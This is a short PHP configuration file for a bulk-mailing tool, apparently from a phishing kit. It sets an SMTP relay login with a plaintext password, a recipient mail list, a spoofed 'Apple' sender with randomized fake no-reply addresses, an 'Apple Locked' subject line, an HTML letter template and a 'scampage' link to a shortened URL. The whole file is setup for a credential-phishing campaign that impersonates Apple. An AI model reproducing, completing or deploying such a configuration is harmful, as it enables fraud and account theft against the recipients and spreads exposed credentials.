<?php

//Regards
date_default_timezone_set('America/New_York');
$date = date('F d, Y, h:i');

/* SMTP SETUP */
$smtp_acc = [
	    [
        "host"     => "smtp-relay.gmail.com",
        "port"     => "587",
        "username" => "admin@stored-based.icu",
        "password" => "FROSH@123"
    ],

];

/* Features SETUP */

$gx_setup = [
    "priority"       => 1,
    "userandom"      => 0,
    "sleeptime"      => 7,
    "replacement"    => 1,
    "filesend"       => 0,
    "userremoveline" => 0,
    "mail_list"      => "file/maillist/test.txt",
    "fromname"       => "Apple",
    "frommail"       => "N0-replyservice##randstring##review1acceslimiteds231@##randstring##-stored-based.icu",
    "subject"        => $date . "Apple Locked #" . RandString(5) . "",
    "msgfile"        => "file/letter/appleletter.html",
    "filepdf"        => "file/attachment/logo.ico",
    "scampage"       => ["https://goo.by/4RdX8"],
];
